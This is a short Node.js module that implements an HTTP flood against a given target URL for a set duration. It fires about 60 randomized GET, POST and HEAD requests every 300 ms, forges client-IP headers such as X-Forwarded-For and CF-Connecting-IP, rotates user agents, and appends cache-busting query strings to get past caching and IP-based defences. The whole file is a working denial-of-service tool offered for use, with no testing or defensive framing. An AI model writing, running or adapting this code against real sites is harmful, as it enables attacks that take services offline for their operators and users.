const http = require("http");
const https = require("https");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "Mozilla/5.0 (X11; Linux x86_64)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)",
  "curl/7.68.0",
  "Wget/1.20.3"
];

const methods = ["GET", "POST", "HEAD"];

function fakeIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join(".");
}

function randomPath(basePath) {
  const param = `?v=${Math.random().toString(36).substring(2)}=${Math.random().toString(36).substring(2)}`;
  return basePath + param;
}

function randomHeaders(hostname) {
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "Referer": `https://www.google.com/search?q=${hostname}`,
    "X-Forwarded-For": fakeIP(),
    "Client-IP": fakeIP(),
    "CF-Connecting-IP": fakeIP(),
    "True-Client-IP": fakeIP(),
    "Cookie": `sessid=${Math.random().toString(36).substring(2)}`
  };
}

module.exports = function(target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const method = methods[Math.floor(Math.random() * methods.length)];
    const headers = randomHeaders(url.hostname);
    const path = randomPath(url.pathname);

    const options = {
      method,
      hostname: url.hostname,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      path,
      headers
    };

    const req = client.request(options, res => {
      console.log(`[${res.statusCode}] from ${url.hostname} using ${method}`);
      res.on("data", () => {});
    });
    req.on("error", () => {});
    if (method === "POST") {
      req.write(`data=${Math.random().toString(36)}`);
    }
    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 60; i++) send(); // Higher than before
    setTimeout(loop, 300);
  }

  loop();
};
